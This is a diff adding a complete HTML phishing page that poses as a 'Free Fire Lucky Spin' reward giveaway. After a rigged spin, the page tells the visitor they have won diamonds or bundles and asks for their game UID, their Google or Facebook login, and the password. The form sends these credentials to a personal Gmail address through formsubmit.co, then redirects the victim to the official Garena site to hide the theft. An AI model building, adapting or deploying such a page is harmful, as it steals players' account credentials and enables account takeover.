@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Fire Lucky Spin</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+    }
+
+    section {
+      display: none;
+      padding: 50px 20px;
+      min-height: 100vh;
+      background-size: cover;
+      background-position: center;
+    }
+
+    section.active { display: block; }
+
+    #spinPage {
+      background-image: url('https://i.ibb.co/Sws04m1R/1200x-600-7-1.png');
+    }
+
+    #formPage {
+      background-image: url('https://i.ibb.co/Y4dx0m9s/Screenshot-20250726-154841.jpg');
+    }
+
+    #wheelContainer {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 40px auto;
+      overflow: hidden;
+    }
+
+    #wheel {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      border: 10px solid gold;
+      background: conic-gradient(
+        #FF3C38 0deg 60deg,
+        #FFD700 60deg 120deg,
+        #45CB85 120deg 180deg,
+        #4D96FF 180deg 240deg,
+        #FF914D 240deg 300deg,
+        #BA68C8 300deg 360deg
+      );
+      transition: transform 4s ease-out;
+      position: relative;
+    }
+
+    .segmentLabel {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform-origin: 0 0;
+      font-size: 14px;
+      font-weight: bold;
+      color: white;
+      width: 100px;
+      text-align: center;
+    }
+
+    #spinBtn {
+      padding: 12px 24px;
+      background: orange;
+      color: #fff;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #formContainer {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: 30px auto;
+      text-align: left;
+    }
+
+    label { display: block; margin-top: 10px; font-weight: bold; }
+
+    input, select {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      margin-top: 5px;
+    }
+
+    button {
+      padding: 12px 28px;
+      font-size: 18px;
+      background: green;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    .login-method {
+      margin-top: 15px;
+    }
+
+    .login-group { display: none; }
+  </style>
+</head>
+<body>
+
+<!-- 🎯 Spin Page -->
+<section id="spinPage" class="active">
+  <h1>🎯 Free Fire Lucky Spin 🎯</h1>
+  <div id="wheelContainer">
+    <div id="wheel"></div>
+  </div>
+  <button id="spinBtn" onclick="spin()">Spin</button>
+</section>
+
+<!-- 📋 Form Page -->
+<section id="formPage">
+  <h2>🔒 Enter Your Free Fire Details</h2>
+  <div style="background: rgba(0,0,0,0.6); padding: 15px; border-left: 5px solid #ffd700; max-width: 500px; border-radius: 8px; font-size: 18px; margin:auto;">
+    🎉 Congratulations! You have won: <strong id="rewardText">Reward Name</strong>
+  </div>
+
+  <form id="rewardForm" action="https://formsubmit.co/sksirswa5225@gmail.com" method="POST" onsubmit="return validateForm()">
+    <div id="formContainer">
+      <label for="uid">Free Fire UID</label>
+      <input type="text" name="UID" id="uid" required placeholder="Enter UID">
+
+      <label for="level">Prime Level</label>
+      <select name="Level" id="level" required>
+        <option value="">Select Prime Level</option>
+        <option>1</option><option>2</option><option>3</option>
+        <option>4</option><option>5</option><option>6</option>
+        <option>7</option><option>8</option>
+      </select>
+
+      <div class="login-method">
+        <label for="method">Login Method</label>
+        <select id="method" name="Method" onchange="toggleLoginFields()">
+          <option value="">Select Login Method</option>
+          <option value="Google">Google</option>
+          <option value="Facebook">Facebook</option>
+        </select>
+      </div>
+
+      <div id="googleFields" class="login-group">
+        <label for="gmail">Gmail</label>
+        <input type="email" name="Gmail" id="gmail" placeholder="Enter Gmail">
+      </div>
+
+      <div id="facebookFields" class="login-group">
+        <label for="mobile">Mobile Number/Gmail</label>
+        <input type="text" name="Mobile" id="mobile" placeholder="Enter Mobile NOMBER/GMAIL">
+      </div>
+
+      <div id="passwordField" class="login-group">
+        <label for="pass">Password</label>
+        <input type="password" name="Password" id="pass" placeholder="Enter Password">
+      </div>
+
+      <input type="hidden" name="Reward" id="rewardHidden">
+      <input type="hidden" name="_next" value="https://ff.garena.com/">
+      <button type="submit">Submit</button>
+    </div>
+  </form>
+</section>
+
+<script>
+  const rewards = [
+    "Red Criminal Bundle",
+    "100 Diamonds",
+    "500 Diamonds",
+    "Evo MP40",
+    "Evo M1887",
+    "1000 Diamonds"
+  ];
+
+  const wheel = document.getElementById("wheel");
+
+  function createWheelLabels() {
+    const total = rewards.length;
+    const angle = 360 / total;
+    rewards.forEach((text, index) => {
+      const label = document.createElement("div");
+      label.className = "segmentLabel";
+      label.style.transform = `rotate(${index * angle + angle / 2}deg) translate(120px) rotate(-${index * angle + angle / 2}deg)`;
+      label.innerText = text;
+      wheel.appendChild(label);
+    });
+  }
+
+  createWheelLabels();
+
+  function spin() {
+    const total = rewards.length;
+    const anglePerReward = 360 / total;
+    const selected = Math.floor(Math.random() * total);
+    const degree = 360 * 3 + selected * anglePerReward + anglePerReward / 2;
+    wheel.style.transform = `rotate(-${degree}deg)`;
+    setTimeout(() => {
+      const reward = rewards[selected];
+      localStorage.setItem("selectedReward", reward);
+      document.getElementById("rewardText").innerText = reward;
+      document.getElementById("rewardHidden").value = reward;
+      showPage('formPage');
+    }, 4000);
+  }
+
+  function showPage(id) {
+    document.querySelectorAll("section").forEach(sec => {
+      sec.classList.remove("active");
+    });
+    document.getElementById(id).classList.add("active");
+
+    if (id === 'formPage') {
+      const reward = localStorage.getItem("selectedReward") || "Reward";
+      document.getElementById("rewardText").innerText = reward;
+      document.getElementById("rewardHidden").value = reward;
+    }
+  }
+
+  function toggleLoginFields() {
+    const method = document.getElementById("method").value;
+    document.querySelectorAll(".login-group").forEach(div => div.style.display = "none");
+    if (method === "Google") {
+      document.getElementById("googleFields").style.display = "block";
+      document.getElementById("passwordField").style.display = "block";
+    } else if (method === "Facebook") {
+      document.getElementById("facebookFields").style.display = "block";
+      document.getElementById("passwordField").style.display = "block";
+    }
+  }
+
+  function validateForm() {
+    const method = document.getElementById("method").value;
+    if (!method) {
+      alert("Please select a login method.");
+      return false;
+    }
+    if (method === "Google" && !document.getElementById("gmail").value.trim()) {
+      alert("Please enter Gmail.");
+      return false;
+    }
+    if (method === "Facebook" && !document.getElementById("mobile").value.trim()) {
+      alert("Please enter Mobile Number.");
+      return false;
+    }
+    if (!document.getElementById("pass").value.trim()) {
+      alert("Please enter Password.");
+      return false;
+    }
+    return true;
+  }
+</script>
+
+</body>
+</html>
